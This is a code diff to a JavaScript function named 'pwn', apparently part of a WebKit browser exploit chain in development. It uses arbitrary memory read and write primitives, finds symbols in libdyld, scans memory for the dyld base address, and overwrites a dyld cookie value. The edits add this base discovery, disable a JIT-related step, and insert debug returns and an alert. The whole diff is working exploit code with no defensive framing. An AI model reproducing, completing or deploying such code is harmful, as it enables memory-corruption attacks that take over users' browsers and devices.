@@ -501,7 +501,7 @@ function pwn() {
     log(`[+] dlsym: ${dlsym_addr}`);
 
     //TEMPORARY DISABLED START
-    var temp_disabled = false;
+    var temp_disabled = true;
     if(!temp_disabled) {
     var jitWriteSeparateHeaps_addr = find_symbol_address(jsc_base, "___ZN3JSC29jitWriteSeparateHeapsFunctionE");
     log(`[+] jitWriteSeparateHeaps: ${jitWriteSeparateHeaps_addr}`);
@@ -688,11 +688,59 @@ function pwn() {
     }
     log(`[+] regloader: ${regloader}`);
 
+
+
+
+    //OBTAIN DYLD_BASE
+    var dyld_process_info_notify_release_addr = find_symbol_address(libdyld_base, "___dyld_process_info_notify_release");
+    log(`[+] dyld_process_info_notify_release_addr: ${dyld_process_info_notify_release_addr}`);
+    var __Z27setNotifyMonitoringDyldMainPFvvE_addr = Add(dyld_process_info_notify_release_addr, 4);
+
+    var __ZL25sNotifyMonitoringDyldMain_addr = follow_adrpLdr(Add(libdyld_base, __Z27setNotifyMonitoringDyldMainPFvvE_addr));
+    log(`[+] __ZL25sNotifyMonitoringDyldMain_addr: ${__ZL25sNotifyMonitoringDyldMain_addr}`);
+
+    var __ZL25sNotifyMonitoringDyldMain = read64(__ZL25sNotifyMonitoringDyldMain_addr);
+    log(`[+] __ZL25sNotifyMonitoringDyldMain: ${__ZL25sNotifyMonitoringDyldMain}`);
+
+    try_count = 0;
+    var dyld_base = Sub(__ZL25sNotifyMonitoringDyldMain, __ZL25sNotifyMonitoringDyldMain.lo() & 0xfff);
+    while (true) {
+        if(try_count > 100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+        opcode = read64(dyld_base);
+        if(opcode == 0x100000CFEEDFACF) {
+            break;
+        }
+        dyld_base = Sub(dyld_base, 0x1000);
+        try_count++;
+    }
+    log(`[i] dyld_base = ${dyld_base}`);
+
+
+
+    
+    // var __ZZ6dlopenE1p = read64(Add(libdyld_base, offsets.__ZZ6dlopenE1p));
+    // log(`[i] __ZZ6dlopenE1p = ${__ZZ6dlopenE1p}`);
+    // dyld_base = Sub(__ZZ6dlopenE1p, offsets.dlopen_internal); //_dlopen_internal = 0xc918
+    // if(__ZZ6dlopenE1p == 0) {
+    //     log(`[-] __ZZ6dlopenE1p is 0, finding other offsets`);
+    //     var __ZL25sNotifyMonitoringDyldMain = read64(Add(libdyld_base, offsets.__ZL25sNotifyMonitoringDyldMain));
+    //     log(`[i] __ZL25sNotifyMonitoringDyldMain = ${__ZL25sNotifyMonitoringDyldMain}`);
+    //     dyld_base = Sub(__ZL25sNotifyMonitoringDyldMain, offsets.__ZN4dyldL24notifyMonitoringDyldMainEv); //__ZN4dyldL24notifyMonitoringDyldMainEv = 0x8a1c
+    // }
+
+    // log(`[i] dyld_base = ${dyld_base} -> ${read64(dyld_base)}`);
+    // var cookieAddr = Add(dyld_base, offsets.cookieAddr);alert(1);
+
+
+
     //fail
     // var __ZZ6dlopenE1p_addr = find_symbol_address(libdyld_base, "__ZZ6dlopenE1p");
     // log(`[+] __ZZ6dlopenE1p: ${__ZZ6dlopenE1p_addr}`);
 
-    // return;
+    return;
 
     // needed arguments to call stage1's _load
     var dlsym = Add(libdyld_base, dlsym_addr);
@@ -723,7 +771,7 @@ function pwn() {
     }
 
     log(`[i] dyld_base = ${dyld_base}`);
-    var cookieAddr = Add(dyld_base, offsets.cookieAddr);
+    var cookieAddr = Add(dyld_base, offsets.cookieAddr);alert(1);
     log(`[i] read cookie  = ${read64(cookieAddr)}`);
     write64(cookieAddr, new Int64(0));
     log(`[i] writechk  = ${read64(cookieAddr)}`);
